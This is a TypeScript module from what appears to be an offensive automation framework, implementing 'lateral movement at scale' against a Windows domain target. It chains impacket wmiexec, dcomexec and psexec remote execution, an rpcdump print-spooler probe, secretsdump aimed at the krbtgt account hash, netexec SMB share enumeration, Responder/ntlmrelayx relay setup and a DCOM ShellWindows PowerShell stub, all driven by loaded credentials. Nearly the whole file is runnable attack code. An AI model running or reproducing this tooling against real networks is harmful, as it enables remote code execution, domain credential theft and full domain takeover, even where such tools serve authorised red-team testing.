/**
 * @module ares/lateral_scale
 * Lateral movement at scale — LivePivotEngine + impacket + Responder/ntlmrelayx chain.
 */
import { LivePivotEngine } from "../live_pivot.ts"
import { ensureAresDir, liveRequired, writeArtifact } from "./_base.ts"
import { loadBestCredential, runIfTool, step, type ExecStep } from "./_integrations.ts"

export interface LateralScaleResult {
  techniques: string[]
  steps: ExecStep[]
  pivot?: unknown
  summary: string
}

export async function runLateralScale(opts: {
  live?: boolean
  target?: string
  domain?: string
  username?: string
  password?: string
}): Promise<LateralScaleResult> {
  liveRequired("ares_lateral_scale", opts)
  const target = opts.target ?? "127.0.0.1"
  const domain = opts.domain ?? "CORP"
  const cred = loadBestCredential(target)
  const user = opts.username ?? cred?.username ?? "administrator"
  const pass = opts.password ?? cred?.secret ?? ""
  const techniques: string[] = []
  const steps: ExecStep[] = []

  const pivot = new LivePivotEngine()
  const pivotResult = await pivot.autoPivot(target, { username: user, password: pass, domain })
  steps.push(step("auto_pivot", pivotResult.findings.length > 0, pivotResult.summary))
  writeArtifact("lateral", "pivot_result.json", JSON.stringify(pivotResult, null, 2))
  techniques.push("smb_enum", "smb_auth", "msf_aux_scan")

  const cmds: Array<{ name: string; tool: string; cmd: string }> = [
    { name: "wmi_exec", tool: "impacket-wmiexec", cmd: `impacket-wmiexec ${domain}/${user}:${pass}@${target} "whoami" 2>&1 | head -c 800` },
    { name: "dcom_exec", tool: "impacket-dcomexec", cmd: `impacket-dcomexec ${domain}/${user}:${pass}@${target} MMC20.Application 2>&1 | head -c 800` },
    { name: "psexec", tool: "impacket-psexec", cmd: `impacket-psexec ${domain}/${user}:${pass}@${target} "whoami" 2>&1 | head -c 800` },
    { name: "rpcdump_spooler", tool: "impacket-rpcdump", cmd: `impacket-rpcdump ${target} 2>&1 | grep -i spooler | head -5` },
    { name: "secretsdump", tool: "impacket-secretsdump", cmd: `impacket-secretsdump ${domain}/${user}:${pass}@${target} -just-dc-user krbtgt 2>&1 | head -c 800` },
  ]

  for (const c of cmds) {
    techniques.push(c.name)
    const s = await runIfTool(c.tool, c.name, c.cmd)
    steps.push(s)
    writeArtifact("lateral", `${c.name}.cmd`, c.cmd)
  }

  if (pass) {
    steps.push(await runIfTool("netexec", "netexec_smb", `netexec smb ${target} -u ${user} -p '${pass.replace(/'/g, "'\\''")}' --shares 2>&1 | head -c 800`))
    techniques.push("netexec_smb")
  }

  steps.push(await runIfTool("responder", "responder_version", "responder --version 2>&1 | head -3"))
  steps.push(await runIfTool("ntlmrelayx", "ntlmrelayx_help", "impacket-ntlmrelayx --help 2>&1 | head -5"))

  const targetsFile = writeArtifact("lateral", "relay_targets.txt", `${target}\n`)
  steps.push(step("relay_targets", true, targetsFile))

  writeArtifact("lateral", "dcom_shellwindows.ps1", `
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("ShellWindows"))
# DCOM lateral — target ${target}
`)
  techniques.push("dcom_shellwindows", "responder_relay", "printnightmare_probe")

  const executed = steps.filter((s) => s.success).length
  return {
    techniques,
    steps,
    pivot: pivotResult,
    summary: `Lateral scale: ${executed}/${steps.length} step(s) succeeded on ${target}`,
  }
}

export default { runLateralScale }
